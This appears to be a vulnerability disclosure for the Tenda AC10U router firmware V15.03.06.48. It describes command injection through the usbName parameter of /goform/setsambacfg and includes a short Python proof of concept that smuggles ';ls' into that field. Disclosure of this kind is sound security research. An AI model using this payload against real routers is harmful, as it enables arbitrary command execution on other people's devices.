## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware  V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware  V15.03.06.48 firmware, we discovered a command injection vulnerablility in the `usbName` parameter and the `usbname`varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `usbName` can trigger this security vulnerability.

![image-20240316184111386](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316184111386.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setsambacfg"
payload = ";ls"

data = {"action":"del","usbName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240316180711436](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316180711436.png)
